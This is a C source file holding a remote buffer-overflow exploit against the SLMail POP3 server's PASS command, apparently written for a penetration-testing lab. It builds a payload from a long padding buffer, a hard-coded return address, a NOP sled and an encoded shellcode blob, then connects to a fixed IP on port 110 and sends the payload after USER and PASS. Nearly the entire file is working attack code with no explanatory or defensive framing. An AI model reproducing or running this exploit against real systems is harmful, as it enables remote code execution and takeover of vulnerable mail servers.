#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
#define retadd "\x8f\x35\x4a\x5f"
#define port 110


char shellcode[] =
"\xd9\xca\xd9\x74\x24\xf4\xbd\x7a\xa3\x46\x48\x58\x31\xc9\xb1"
"\x52\x83\xc0\x04\x31\x68\x13\x03\x12\xb0\xa4\xbd\x1e\x5e\xaa"
"\x3e\xde\x9f\xcb\xb7\x3b\xae\xcb\xac\x48\x81\xfb\xa7\x1c\x2e"
"\x77\xe5\xb4\xa5\xf5\x22\xbb\x0e\xb3\x14\xf2\x8f\xe8\x65\x95"
"\x13\xf3\xb9\x75\x2d\x3c\xcc\x74\x6a\x21\x3d\x24\x23\x2d\x90"
"\xd8\x40\x7b\x29\x53\x1a\x6d\x29\x80\xeb\x8c\x18\x17\x67\xd7"
"\xba\x96\xa4\x63\xf3\x80\xa9\x4e\x4d\x3b\x19\x24\x4c\xed\x53"
"\xc5\xe3\xd0\x5b\x34\xfd\x15\x5b\xa7\x88\x6f\x9f\x5a\x8b\xb4"
"\xdd\x80\x1e\x2e\x45\x42\xb8\x8a\x77\x87\x5f\x59\x7b\x6c\x2b"
"\x05\x98\x73\xf8\x3e\xa4\xf8\xff\x90\x2c\xba\xdb\x34\x74\x18"
"\x45\x6d\xd0\xcf\x7a\x6d\xbb\xb0\xde\xe6\x56\xa4\x52\xa5\x3e"
"\x09\x5f\x55\xbf\x05\xe8\x26\x8d\x8a\x42\xa0\xbd\x43\x4d\x37"
"\xc1\x79\x29\xa7\x3c\x82\x4a\xee\xfa\xd6\x1a\x98\x2b\x57\xf1"
"\x58\xd3\x82\x56\x08\x7b\x7d\x17\xf8\x3b\x2d\xff\x12\xb4\x12"
"\x1f\x1d\x1e\x3b\x8a\xe4\xc9\xe8\x54\xe2\x82\x99\x68\xea\x84"
"\x4b\xe4\x0c\xce\x7b\xa0\x87\x67\xe5\xe9\x53\x19\xea\x27\x1e"
"\x19\x60\xc4\xdf\xd4\x81\xa1\xf3\x81\x61\xfc\xa9\x04\x7d\x2a"
"\xc5\xcb\xec\xb1\x15\x85\x0c\x6e\x42\xc2\xe3\x67\x06\xfe\x5a"
"\xde\x34\x03\x3a\x19\xfc\xd8\xff\xa4\xfd\xad\x44\x83\xed\x6b"
"\x44\x8f\x59\x24\x13\x59\x37\x82\xcd\x2b\xe1\x5c\xa1\xe5\x65"
"\x18\x89\x35\xf3\x25\xc4\xc3\x1b\x97\xb1\x95\x24\x18\x56\x12"
"\x5d\x44\xc6\xdd\xb4\xcc\xe6\x3f\x1c\x39\x8f\x99\xf5\x80\xd2"
"\x19\x20\xc6\xea\x99\xc0\xb7\x08\x81\xa1\xb2\x55\x05\x5a\xcf"
"\xc6\xe0\x5c\x7c\xe6\x20";
 
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
  int xs;
    char out[1024];
    char *buffer = malloc(3200);
    memset(buffer, 0x00, 3200);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(12);
    memset(nop, 0x00, 12);
    memset(nop, 0x90, 12);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("172.31.2.202");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);
}
